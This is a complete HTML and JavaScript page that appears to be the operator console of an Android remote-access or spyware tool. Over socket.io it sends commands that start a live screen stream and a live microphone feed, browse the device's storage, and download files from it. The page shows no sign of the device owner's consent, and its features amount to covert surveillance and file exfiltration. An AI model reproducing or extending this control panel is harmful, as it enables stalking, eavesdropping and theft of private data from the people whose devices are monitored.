<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Control Center</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: #fff; margin: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 8px; border: 1px solid #333; }
        #screen-view { width: 100%; border-radius: 4px; background: #000; }
        .btn { padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn-green { background: #2e7d32; color: white; }
        .btn-red { background: #c62828; color: white; }
        #file-container { height: 200px; overflow-y: auto; background: #000; margin-top: 10px; padding: 10px; }
        .file-item { padding: 8px; border-bottom: 1px solid #222; cursor: pointer; }
    </style>
</head>
<body>
    <h1>System Monitor</h1>
    <div id="status">Connecting...</div>

    <div class="grid">
        <div class="card">
            <h3>Live Screen</h3>
            <img id="screen-view" src="" alt="Stream Offline">
            <button class="btn btn-green" onclick="emit('start-screen')">Start</button>
            <button class="btn btn-red" onclick="emit('stop-screen')">Stop</button>
        </div>

        <div class="card">
            <h3>Live Audio</h3>
            <button class="btn btn-green" onclick="startAudio()">Listen</button>
            <button class="btn btn-red" onclick="emit('stop-audio')">Mute</button>
        </div>

        <div class="card">
            <h3>Files</h3>
            <button class="btn" onclick="emit('list-files:/storage/emulated/0')">Home Directory</button>
            <div id="file-container"></div>
        </div>
    </div>

    <script>
        // Automatic connection to current host
        const socket = io(); 
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
        let nextStart = 0;

        socket.on('connect', () => document.getElementById('status').innerText = "Online");
        socket.on('data-stream', (b64) => document.getElementById('screen-view').src = "data:image/jpeg;base64," + b64);

        function emit(cmd) { socket.emit('command', cmd); }

        function startAudio() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            emit('start-audio');
        }

        socket.on('audio-stream', (b64) => {
            const binary = window.atob(b64);
            const bytes = new Int16Array(binary.length / 2);
            for (let i = 0; i < binary.length; i += 2) {
                bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
            }
            const f32 = new Float32Array(bytes.length);
            for (let i = 0; i < bytes.length; i++) f32[i] = bytes[i] / 32768.0;
            
            const buf = audioCtx.createBuffer(1, f32.length, 44100);
            buf.getChannelData(0).set(f32);
            const src = audioCtx.createBufferSource();
            src.buffer = buf;
            src.connect(audioCtx.destination);
            nextStart = Math.max(nextStart, audioCtx.currentTime);
            src.start(nextStart);
            nextStart += buf.duration;
        });

        socket.on('file-list', (json) => {
            const list = JSON.parse(json).files;
            const cont = document.getElementById('file-container');
            cont.innerHTML = '';
            list.forEach(f => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.innerText = (f.isDir ? "ðŸ“ " : "ðŸ“„ ") + f.name;
                div.onclick = () => f.isDir ? emit('list-files:' + f.path) : emit('download:' + f.path);
                cont.appendChild(div);
            });
        });

        socket.on('file-download', (json) => {
            const f = JSON.parse(json);
            const a = document.createElement('a');
            a.href = "data:application/octet-stream;base64," + f.data;
            a.download = f.name;
            a.click();
        });
    </script>
</body>
</html>
